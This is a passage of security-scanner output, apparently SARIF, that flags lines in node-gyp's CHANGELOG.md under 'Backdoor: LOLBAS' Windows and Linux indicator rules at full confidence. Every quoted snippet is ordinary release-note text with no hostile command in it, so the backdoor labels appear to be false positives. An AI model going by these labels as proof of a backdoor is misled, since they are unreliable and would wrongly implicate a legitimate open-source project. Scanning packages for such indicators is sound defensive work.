                      "markdown": "`\n* npm is currently v10 ([#2970](https://github.com/nodejs/node-gyp/issues/2970)) ([7705a22](https://github.com/nodejs/node-gyp/commit/7705a22f31a62076e9f8429780a459f4ad71ea4c))\n* remove outdated Node versions from readme ([#2955](https://github.com/nodejs/node-gyp/issues/2955)) ([ae8478e](https://github.com/nodejs/node-gyp/commit/ae8478ec32d9b2fa71b591ac22cdf867ef2e9a7d))\n* remove outdated update engines.node reference in 10.0.0 changelog ([b42e796](https://github.com/nodejs/node-gyp/commit/b42e7966177f006f3d1aab1d27885d8372c8ed01))\n\n\n### Miscellaneous\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 1,
                  "endLine": 46,
                  "endColumn": 9,
                  "snippet": {
                    "text": "961)) ([b1f1808](https://github.com/nodejs/node-gyp/commit/b1f1808bfff0d51e6d3eb696ab6a5b89b7b9630c))\n* print Python executable path using UTF-8 ([#2995](https://github.com/nodejs/node-gyp/issues/2995)) ([c472912](https://github.com/nodejs/node-gyp/commit/c4729129daa9bb5204246b857826fb391ac961e1))\n* update supported vs versions ([#2959](https://github.com/nodejs/node-gyp/issues/2959)) ([391cc5b](https://github.com/nodejs/node-gyp/commit/391cc5b9b25cffe0cb2edcba3583414a771b4a15))\n\n\n### Doc\n\n* npm is currently v10 ([#2970](https://github.com/nodejs/node-gyp/issues/2970)) ([7705a22](https://github.com/no",
                    "rendered": {
                      "text": "961)) ([b1f1808](https://github.com/nodejs/node-gyp/commit/b1f1808bfff0d51e6d3eb696ab6a5b89b7b9630c))\n* print Python executable path using UTF-8 ([#2995](https://github.com/nodejs/node-gyp/issues/2995)) ([c472912](https://github.com/nodejs/node-gyp/commit/c4729129daa9bb5204246b857826fb391ac961e1))\n* update supported vs versions ([#2959](https://github.com/nodejs/node-gyp/issues/2959)) ([391cc5b](https://github.com/nodejs/node-gyp/commit/391cc5b9b25cffe0cb2edcba3583414a771b4a15))\n\n\n### Doc\n\n* npm is currently v10 ([#2970](https://github.com/nodejs/node-gyp/issues/2970)) ([7705a22](https://github.com/no",
                      "markdown": "`961)) ([b1f1808](https://github.com/nodejs/node-gyp/commit/b1f1808bfff0d51e6d3eb696ab6a5b89b7b9630c))\n* print Python executable path using UTF-8 ([#2995](https://github.com/nodejs/node-gyp/issues/2995)) ([c472912](https://github.com/nodejs/node-gyp/commit/c4729129daa9bb5204246b857826fb391ac961e1))\n* update supported vs versions ([#2959](https://github.com/nodejs/node-gyp/issues/2959)) ([391cc5b](https://github.com/nodejs/node-gyp/commit/391cc5b9b25cffe0cb2edcba3583414a771b4a15))\n\n\n### Doc\n\n* npm is currently v10 ([#2970](https://github.com/nodejs/node-gyp/issues/2970)) ([7705a22](https://github.com/no`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 9,
                  "startColumn": 10,
                  "endLine": 9,
                  "endColumn": 18,
                  "snippet": {
                    "text": "/github.com/nodejs/node-gyp/compare/v10.1.0...v10.2.0) (2024-07-09)\n\n\n### Features\n\n* allow VCINSTALLDIR to specify a portable instance ([#3036](https://github.com/nodejs/node-gyp/issues/3036)) ([d38af2e](https://github.com/nodejs/node-gyp/commit/d38af2e0c2a81b12cd221b1f8517fb89e609d62c))\n* **gyp:** update gyp to v0.18.1 ([#3039](https://github.com/nodejs/node-gyp/issues/3039)) ([ea99fea](https://github.com/nodejs/node-gyp/commit/ea99fea83485dc5be04db01df9b2fdbe05319b8e))\n* support `rebuild` and `build` for cross-compiling Node-API module to wasm on Windows ([#2974](https://github.com/nodejs/node-gyp/",
                    "rendered": {
                      "text": "/github.com/nodejs/node-gyp/compare/v10.1.0...v10.2.0) (2024-07-09)\n\n\n### Features\n\n* allow VCINSTALLDIR to specify a portable instance ([#3036](https://github.com/nodejs/node-gyp/issues/3036)) ([d38af2e](https://github.com/nodejs/node-gyp/commit/d38af2e0c2a81b12cd221b1f8517fb89e609d62c))\n* **gyp:** update gyp to v0.18.1 ([#3039](https://github.com/nodejs/node-gyp/issues/3039)) ([ea99fea](https://github.com/nodejs/node-gyp/commit/ea99fea83485dc5be04db01df9b2fdbe05319b8e))\n* support `rebuild` and `build` for cross-compiling Node-API module to wasm on Windows ([#2974](https://github.com/nodejs/node-gyp/",
                      "markdown": "`/github.com/nodejs/node-gyp/compare/v10.1.0...v10.2.0) (2024-07-09)\n\n\n### Features\n\n* allow VCINSTALLDIR to specify a portable instance ([#3036](https://github.com/nodejs/node-gyp/issues/3036)) ([d38af2e](https://github.com/nodejs/node-gyp/commit/d38af2e0c2a81b12cd221b1f8517fb89e609d62c))\n* **gyp:** update gyp to v0.18.1 ([#3039](https://github.com/nodejs/node-gyp/issues/3039)) ([ea99fea](https://github.com/nodejs/node-gyp/commit/ea99fea83485dc5be04db01df9b2fdbe05319b8e))\n* support `rebuild` and `build` for cross-compiling Node-API module to wasm on Windows ([#2974](https://github.com/nodejs/node-gyp/`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 957,
                  "startColumn": 33,
                  "endLine": 958,
                  "snippet": {
                    "text": "  * Updated README.md with updated Windows build info\n  * Show URL when a download fails\n  * package: add a \"license\" field\n  * move HMODULE m declaration to top\n  * Only add \"-undefined dynamic_lookup\" to loadable_module targets\n  * win: optionally allow node.exe/iojs.exe to be renamed\n  * Avoid downloading shasums if using tarPath\n  * Add target name preprocessor define: `NODE_GYP_MODULE_NAME`\n",
                    "rendered": {
                      "text": "  * Updated README.md with updated Windows build info\n  * Show URL when a download fails\n  * package: add a \"license\" field\n  * move HMODULE m declaration to top\n  * Only add \"-undefined dynamic_lookup\" to loadable_module targets\n  * win: optionally allow node.exe/iojs.exe to be renamed\n  * Avoid downloading shasums if using tarPath\n  * Add target name preprocessor define: `NODE_GYP_MODULE_NAME`\n",
                      "markdown": "`  * Updated README.md with updated Windows build info\n  * Show URL when a download fails\n  * package: add a \"license\" field\n  * move HMODULE m declaration to top\n  * Only add \"-undefined dynamic_lookup\" to loadable_module targets\n  * win: optionally allow node.exe/iojs.exe to be renamed\n  * Avoid downloading shasums if using tarPath\n  * Add target name preprocessor define: `NODE_GYP_MODULE_NAME`\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 919,
                  "startColumn": 117,
                  "endLine": 919,
                  "endColumn": 123,
                  "snippet": {
                    "text": "github.com/nodejs/node-gyp/commit/938dd18d1c)] - refactor for clarity, fix dist-url, add env var dist-url functionality (Rod Vagg) [#711](https://github.com/nodejs/node-gyp/pull/711)\n* [[`9e9df66a06`](https://github.com/nodejs/node-gyp/commit/9e9df66a06)] - use process.release, make aware of io.js & node v4 differences (Rod Vagg) [#711](https://github.com/nodejs/node-gyp/pull/711)\n* [[`1ea7ed01f4`](https://github.com/nodejs/node-gyp/commit/1ea7ed01f4)] - **deps**: update graceful-fs dependency to the latest (Sakthipriyan Vairamani) [#714](https://github.com/nodejs/node-gyp/pull/714)\n* [[`0fbc387b35`",
                    "rendered": {
                      "text": "github.com/nodejs/node-gyp/commit/938dd18d1c)] - refactor for clarity, fix dist-url, add env var dist-url functionality (Rod Vagg) [#711](https://github.com/nodejs/node-gyp/pull/711)\n* [[`9e9df66a06`](https://github.com/nodejs/node-gyp/commit/9e9df66a06)] - use process.release, make aware of io.js & node v4 differences (Rod Vagg) [#711](https://github.com/nodejs/node-gyp/pull/711)\n* [[`1ea7ed01f4`](https://github.com/nodejs/node-gyp/commit/1ea7ed01f4)] - **deps**: update graceful-fs dependency to the latest (Sakthipriyan Vairamani) [#714](https://github.com/nodejs/node-gyp/pull/714)\n* [[`0fbc387b35`",
                      "markdown": "`github.com/nodejs/node-gyp/commit/938dd18d1c)] - refactor for clarity, fix dist-url, add env var dist-url functionality (Rod Vagg) [#711](https://github.com/nodejs/node-gyp/pull/711)\n* [[`9e9df66a06`](https://github.com/nodejs/node-gyp/commit/9e9df66a06)] - use process.release, make aware of io.js & node v4 differences (Rod Vagg) [#711](https://github.com/nodejs/node-gyp/pull/711)\n* [[`1ea7ed01f4`](https://github.com/nodejs/node-gyp/commit/1ea7ed01f4)] - **deps**: update graceful-fs dependency to the latest (Sakthipriyan Vairamani) [#714](https://github.com/nodejs/node-gyp/pull/714)\n* [[`0fbc387b35``"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 918,
                  "startColumn": 114,
                  "endLine": 918,
                  "endColumn": 119,
                  "snippet": {
                    "text": "20db7`](https://github.com/nodejs/node-gyp/commit/6dcf220db7)] - test version major directly, don't use semver.satisfies() (Rod Vagg) [#711](https://github.com/nodejs/node-gyp/pull/711)\n* [[`938dd18d1c`](https://github.com/nodejs/node-gyp/commit/938dd18d1c)] - refactor for clarity, fix dist-url, add env var dist-url functionality (Rod Vagg) [#711](https://github.com/nodejs/node-gyp/pull/711)\n* [[`9e9df66a06`](https://github.com/nodejs/node-gyp/commit/9e9df66a06)] - use process.release, make aware of io.js & node v4 differences (Rod Vagg) [#711](https://github.com/nodejs/node-gyp/pull/711)\n* [[`1ea7",
                    "rendered": {
                      "text": "20db7`](https://github.com/nodejs/node-gyp/commit/6dcf220db7)] - test version major directly, don't use semver.satisfies() (Rod Vagg) [#711](https://github.com/nodejs/node-gyp/pull/711)\n* [[`938dd18d1c`](https://github.com/nodejs/node-gyp/commit/938dd18d1c)] - refactor for clarity, fix dist-url, add env var dist-url functionality (Rod Vagg) [#711](https://github.com/nodejs/node-gyp/pull/711)\n* [[`9e9df66a06`](https://github.com/nodejs/node-gyp/commit/9e9df66a06)] - use process.release, make aware of io.js & node v4 differences (Rod Vagg) [#711](https://github.com/nodejs/node-gyp/pull/711)\n* [[`1ea7",
                      "markdown": "`20db7`](https://github.com/nodejs/node-gyp/commit/6dcf220db7)] - test version major directly, don't use semver.satisfies() (Rod Vagg) [#711](https://github.com/nodejs/node-gyp/pull/711)\n* [[`938dd18d1c`](https://github.com/nodejs/node-gyp/commit/938dd18d1c)] - refactor for clarity, fix dist-url, add env var dist-url functionality (Rod Vagg) [#711](https://github.com/nodejs/node-gyp/pull/711)\n* [[`9e9df66a06`](https://github.com/nodejs/node-gyp/commit/9e9df66a06)] - use process.release, make aware of io.js & node v4 differences (Rod Vagg) [#711](https://github.com/nodejs/node-gyp/pull/711)\n* [[`1ea7`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 824,
                  "startColumn": 83,
                  "endLine": 824,
                  "endColumn": 89,
                  "snippet": {
                    "text": "-gyp/pull/1152)\n* [[`da9cb5f411`](https://github.com/nodejs/node-gyp/commit/da9cb5f411)] - Delete superfluous .patch files. (Ben Noordhuis) [#1122](https://github.com/nodejs/node-gyp/pull/1122)\n\n## v3.6.0 2017-03-16\n\n* [[`ae141e1906`](https://github.com/nodejs/node-gyp/commit/ae141e1906)] - **win**: find and setup for VS2017 (Refael Ackermann) [#1130](https://github.com/nodejs/node-gyp/pull/1130)\n* [[`ec5fc36a80`](https://github.com/nodejs/node-gyp/commit/ec5fc36a80)] - Add support to build node.js with chakracore for ARM. (Kunal Pathak) [#873](https://github.com/nodejs/node-gyp/pull/873)\n* [[`a04ea",
                    "rendered": {
                      "text": "-gyp/pull/1152)\n* [[`da9cb5f411`](https://github.com/nodejs/node-gyp/commit/da9cb5f411)] - Delete superfluous .patch files. (Ben Noordhuis) [#1122](https://github.com/nodejs/node-gyp/pull/1122)\n\n## v3.6.0 2017-03-16\n\n* [[`ae141e1906`](https://github.com/nodejs/node-gyp/commit/ae141e1906)] - **win**: find and setup for VS2017 (Refael Ackermann) [#1130](https://github.com/nodejs/node-gyp/pull/1130)\n* [[`ec5fc36a80`](https://github.com/nodejs/node-gyp/commit/ec5fc36a80)] - Add support to build node.js with chakracore for ARM. (Kunal Pathak) [#873](https://github.com/nodejs/node-gyp/pull/873)\n* [[`a04ea",
                      "markdown": "`-gyp/pull/1152)\n* [[`da9cb5f411`](https://github.com/nodejs/node-gyp/commit/da9cb5f411)] - Delete superfluous .patch files. (Ben Noordhuis) [#1122](https://github.com/nodejs/node-gyp/pull/1122)\n\n## v3.6.0 2017-03-16\n\n* [[`ae141e1906`](https://github.com/nodejs/node-gyp/commit/ae141e1906)] - **win**: find and setup for VS2017 (Refael Ackermann) [#1130](https://github.com/nodejs/node-gyp/pull/1130)\n* [[`ec5fc36a80`](https://github.com/nodejs/node-gyp/commit/ec5fc36a80)] - Add support to build node.js with chakracore for ARM. (Kunal Pathak) [#873](https://github.com/nodejs/node-gyp/pull/873)\n* [[`a04ea`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 753,
                  "startColumn": 104,
                  "endLine": 753,
                  "endColumn": 109,
                  "snippet": {
                    "text": "\n* [[`ceed5cbe10`](https://github.com/nodejs/node-gyp/commit/ceed5cbe10)] - **deps**: updated tar package version to 4.4.8 (Pobegaylo Maksim) [#1713](https://github.com/nodejs/node-gyp/pull/1713)\n* [[`374519e066`](https://github.com/nodejs/node-gyp/commit/374519e066)] - **(SEMVER-MAJOR)** Upgrade to tar v3 (isaacs) [#1212](https://github.com/nodejs/node-gyp/pull/1212)\n* [[`e6699d13cd`](https://github.com/nodejs/node-gyp/commit/e6699d13cd)] - **test**: fix addon test for Node.js 12 and V8 7.4 (Richard Lau) [#1705](https://github.com/nodejs/node-gyp/pull/1705)\n* [[`0c6bf530a0`](https://github.com/nod",
                    "rendered": {
                      "text": "\n* [[`ceed5cbe10`](https://github.com/nodejs/node-gyp/commit/ceed5cbe10)] - **deps**: updated tar package version to 4.4.8 (Pobegaylo Maksim) [#1713](https://github.com/nodejs/node-gyp/pull/1713)\n* [[`374519e066`](https://github.com/nodejs/node-gyp/commit/374519e066)] - **(SEMVER-MAJOR)** Upgrade to tar v3 (isaacs) [#1212](https://github.com/nodejs/node-gyp/pull/1212)\n* [[`e6699d13cd`](https://github.com/nodejs/node-gyp/commit/e6699d13cd)] - **test**: fix addon test for Node.js 12 and V8 7.4 (Richard Lau) [#1705](https://github.com/nodejs/node-gyp/pull/1705)\n* [[`0c6bf530a0`](https://github.com/nod",
                      "markdown": "`\n* [[`ceed5cbe10`](https://github.com/nodejs/node-gyp/commit/ceed5cbe10)] - **deps**: updated tar package version to 4.4.8 (Pobegaylo Maksim) [#1713](https://github.com/nodejs/node-gyp/pull/1713)\n* [[`374519e066`](https://github.com/nodejs/node-gyp/commit/374519e066)] - **(SEMVER-MAJOR)** Upgrade to tar v3 (isaacs) [#1212](https://github.com/nodejs/node-gyp/pull/1212)\n* [[`e6699d13cd`](https://github.com/nodejs/node-gyp/commit/e6699d13cd)] - **test**: fix addon test for Node.js 12 and V8 7.4 (Richard Lau) [#1705](https://github.com/nodejs/node-gyp/pull/1705)\n* [[`0c6bf530a0`](https://github.com/nod`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 752,
                  "startColumn": 92,
                  "endLine": 752,
                  "endColumn": 97,
                  "snippet": {
                    "text": "yp/pull/1655)\n* [[`a5b7410497`](https://github.com/nodejs/node-gyp/commit/a5b7410497)] - Add ESLint no-unused-vars rule (Jon Moss) [#1497](https://github.com/nodejs/node-gyp/pull/1497)\n\n## v4.0.0 2019-04-24\n\n* [[`ceed5cbe10`](https://github.com/nodejs/node-gyp/commit/ceed5cbe10)] - **deps**: updated tar package version to 4.4.8 (Pobegaylo Maksim) [#1713](https://github.com/nodejs/node-gyp/pull/1713)\n* [[`374519e066`](https://github.com/nodejs/node-gyp/commit/374519e066)] - **(SEMVER-MAJOR)** Upgrade to tar v3 (isaacs) [#1212](https://github.com/nodejs/node-gyp/pull/1212)\n* [[`e6699d13cd`](https://g",
                    "rendered": {
                      "text": "yp/pull/1655)\n* [[`a5b7410497`](https://github.com/nodejs/node-gyp/commit/a5b7410497)] - Add ESLint no-unused-vars rule (Jon Moss) [#1497](https://github.com/nodejs/node-gyp/pull/1497)\n\n## v4.0.0 2019-04-24\n\n* [[`ceed5cbe10`](https://github.com/nodejs/node-gyp/commit/ceed5cbe10)] - **deps**: updated tar package version to 4.4.8 (Pobegaylo Maksim) [#1713](https://github.com/nodejs/node-gyp/pull/1713)\n* [[`374519e066`](https://github.com/nodejs/node-gyp/commit/374519e066)] - **(SEMVER-MAJOR)** Upgrade to tar v3 (isaacs) [#1212](https://github.com/nodejs/node-gyp/pull/1212)\n* [[`e6699d13cd`](https://g",
                      "markdown": "`yp/pull/1655)\n* [[`a5b7410497`](https://github.com/nodejs/node-gyp/commit/a5b7410497)] - Add ESLint no-unused-vars rule (Jon Moss) [#1497](https://github.com/nodejs/node-gyp/pull/1497)\n\n## v4.0.0 2019-04-24\n\n* [[`ceed5cbe10`](https://github.com/nodejs/node-gyp/commit/ceed5cbe10)] - **deps**: updated tar package version to 4.4.8 (Pobegaylo Maksim) [#1713](https://github.com/nodejs/node-gyp/pull/1713)\n* [[`374519e066`](https://github.com/nodejs/node-gyp/commit/374519e066)] - **(SEMVER-MAJOR)** Upgrade to tar v3 (isaacs) [#1212](https://github.com/nodejs/node-gyp/pull/1212)\n* [[`e6699d13cd`](https://g`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 694,
                  "startColumn": 122,
                  "endLine": 694,
                  "endColumn": 127,
                  "snippet": {
                    "text": "`a991f633d6`](https://github.com/nodejs/node-gyp/commit/a991f633d6)] - **gyp**: fix the remaining Python 3 issues (cclauss) [#1793](https://github.com/nodejs/node-gyp/pull/1793)\n* [[`f952b08f84`](https://github.com/nodejs/node-gyp/commit/f952b08f84)] - **gyp**: move from \\_\\_future\\_\\_ import to the top of the file (cclauss) [#1789](https://github.com/nodejs/node-gyp/pull/1789)\n* [[`4f4a677dfa`](https://github.com/nodejs/node-gyp/commit/4f4a677dfa)] - **gyp**: use different default compiler for z/OS (Shuowang (Wayne) Zhang) [#1768](https://github.com/nodejs/node-gyp/pull/1768)\n* [[`03683f09d6`](htt",
                    "rendered": {
                      "text": "`a991f633d6`](https://github.com/nodejs/node-gyp/commit/a991f633d6)] - **gyp**: fix the remaining Python 3 issues (cclauss) [#1793](https://github.com/nodejs/node-gyp/pull/1793)\n* [[`f952b08f84`](https://github.com/nodejs/node-gyp/commit/f952b08f84)] - **gyp**: move from \\_\\_future\\_\\_ import to the top of the file (cclauss) [#1789](https://github.com/nodejs/node-gyp/pull/1789)\n* [[`4f4a677dfa`](https://github.com/nodejs/node-gyp/commit/4f4a677dfa)] - **gyp**: use different default compiler for z/OS (Shuowang (Wayne) Zhang) [#1768](https://github.com/nodejs/node-gyp/pull/1768)\n* [[`03683f09d6`](htt",
                      "markdown": "``a991f633d6`](https://github.com/nodejs/node-gyp/commit/a991f633d6)] - **gyp**: fix the remaining Python 3 issues (cclauss) [#1793](https://github.com/nodejs/node-gyp/pull/1793)\n* [[`f952b08f84`](https://github.com/nodejs/node-gyp/commit/f952b08f84)] - **gyp**: move from \\_\\_future\\_\\_ import to the top of the file (cclauss) [#1789](https://github.com/nodejs/node-gyp/pull/1789)\n* [[`4f4a677dfa`](https://github.com/nodejs/node-gyp/commit/4f4a677dfa)] - **gyp**: use different default compiler for z/OS (Shuowang (Wayne) Zhang) [#1768](https://github.com/nodejs/node-gyp/pull/1768)\n* [[`03683f09d6`](htt`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 685,
                  "startColumn": 119,
                  "endLine": 685,
                  "endColumn": 125,
                  "snippet": {
                    "text": "068f`](https://github.com/nodejs/node-gyp/commit/7e8127068f)] - **test**: cover supported node versions with travis (Rod Vagg) [#1809](https://github.com/nodejs/node-gyp/pull/1809)\n* [[`24109148df`](https://github.com/nodejs/node-gyp/commit/24109148df)] - **test**: downgrade to tap@^12 for continued Node 6 support (Rod Vagg) [#1808](https://github.com/nodejs/node-gyp/pull/1808)\n* [[`656117cc4a`](https://github.com/nodejs/node-gyp/commit/656117cc4a)] - **win**: make VS path match case-insensitive (João Reis) [#1806](https://github.com/nodejs/node-gyp/pull/1806)\n\n## v5.0.2 2019-06-27\n\n* [[`2761afbf73`",
                    "rendered": {
                      "text": "068f`](https://github.com/nodejs/node-gyp/commit/7e8127068f)] - **test**: cover supported node versions with travis (Rod Vagg) [#1809](https://github.com/nodejs/node-gyp/pull/1809)\n* [[`24109148df`](https://github.com/nodejs/node-gyp/commit/24109148df)] - **test**: downgrade to tap@^12 for continued Node 6 support (Rod Vagg) [#1808](https://github.com/nodejs/node-gyp/pull/1808)\n* [[`656117cc4a`](https://github.com/nodejs/node-gyp/commit/656117cc4a)] - **win**: make VS path match case-insensitive (João Reis) [#1806](https://github.com/nodejs/node-gyp/pull/1806)\n\n## v5.0.2 2019-06-27\n\n* [[`2761afbf73`",
                      "markdown": "`068f`](https://github.com/nodejs/node-gyp/commit/7e8127068f)] - **test**: cover supported node versions with travis (Rod Vagg) [#1809](https://github.com/nodejs/node-gyp/pull/1809)\n* [[`24109148df`](https://github.com/nodejs/node-gyp/commit/24109148df)] - **test**: downgrade to tap@^12 for continued Node 6 support (Rod Vagg) [#1808](https://github.com/nodejs/node-gyp/pull/1808)\n* [[`656117cc4a`](https://github.com/nodejs/node-gyp/commit/656117cc4a)] - **win**: make VS path match case-insensitive (João Reis) [#1806](https://github.com/nodejs/node-gyp/pull/1806)\n\n## v5.0.2 2019-06-27\n\n* [[`2761afbf73``"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 684,
                  "startColumn": 100,
                  "endLine": 684,
                  "endColumn": 106,
                  "snippet": {
                    "text": "/nodejs/node-gyp/pull/1812)\n* [[`7fd924079f`](https://github.com/nodejs/node-gyp/commit/7fd924079f)] - **test**: increase tap timeout (João Reis) [#1812](https://github.com/nodejs/node-gyp/pull/1812)\n* [[`7e8127068f`](https://github.com/nodejs/node-gyp/commit/7e8127068f)] - **test**: cover supported node versions with travis (Rod Vagg) [#1809](https://github.com/nodejs/node-gyp/pull/1809)\n* [[`24109148df`](https://github.com/nodejs/node-gyp/commit/24109148df)] - **test**: downgrade to tap@^12 for continued Node 6 support (Rod Vagg) [#1808](https://github.com/nodejs/node-gyp/pull/1808)\n* [[`656117cc4",
                    "rendered": {
                      "text": "/nodejs/node-gyp/pull/1812)\n* [[`7fd924079f`](https://github.com/nodejs/node-gyp/commit/7fd924079f)] - **test**: increase tap timeout (João Reis) [#1812](https://github.com/nodejs/node-gyp/pull/1812)\n* [[`7e8127068f`](https://github.com/nodejs/node-gyp/commit/7e8127068f)] - **test**: cover supported node versions with travis (Rod Vagg) [#1809](https://github.com/nodejs/node-gyp/pull/1809)\n* [[`24109148df`](https://github.com/nodejs/node-gyp/commit/24109148df)] - **test**: downgrade to tap@^12 for continued Node 6 support (Rod Vagg) [#1808](https://github.com/nodejs/node-gyp/pull/1808)\n* [[`656117cc4",
                      "markdown": "`/nodejs/node-gyp/pull/1812)\n* [[`7fd924079f`](https://github.com/nodejs/node-gyp/commit/7fd924079f)] - **test**: increase tap timeout (João Reis) [#1812](https://github.com/nodejs/node-gyp/pull/1812)\n* [[`7e8127068f`](https://github.com/nodejs/node-gyp/commit/7e8127068f)] - **test**: cover supported node versions with travis (Rod Vagg) [#1809](https://github.com/nodejs/node-gyp/pull/1809)\n* [[`24109148df`](https://github.com/nodejs/node-gyp/commit/24109148df)] - **test**: downgrade to tap@^12 for continued Node 6 support (Rod Vagg) [#1808](https://github.com/nodejs/node-gyp/pull/1808)\n* [[`656117cc4`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 683,
                  "startColumn": 97,
                  "endLine": 683,
                  "endColumn": 106,
                  "snippet": {
                    "text": "yp/pull/1794)\n* [[`bb92c761a9`](https://github.com/nodejs/node-gyp/commit/bb92c761a9)] - **test**: add Node.js 6 on Windows to Travis CI (João Reis) [#1812](https://github.com/nodejs/node-gyp/pull/1812)\n* [[`7fd924079f`](https://github.com/nodejs/node-gyp/commit/7fd924079f)] - **test**: increase tap timeout (João Reis) [#1812](https://github.com/nodejs/node-gyp/pull/1812)\n* [[`7e8127068f`](https://github.com/nodejs/node-gyp/commit/7e8127068f)] - **test**: cover supported node versions with travis (Rod Vagg) [#1809](https://github.com/nodejs/node-gyp/pull/1809)\n* [[`24109148df`](https://github.com/nodej",
                    "rendered": {
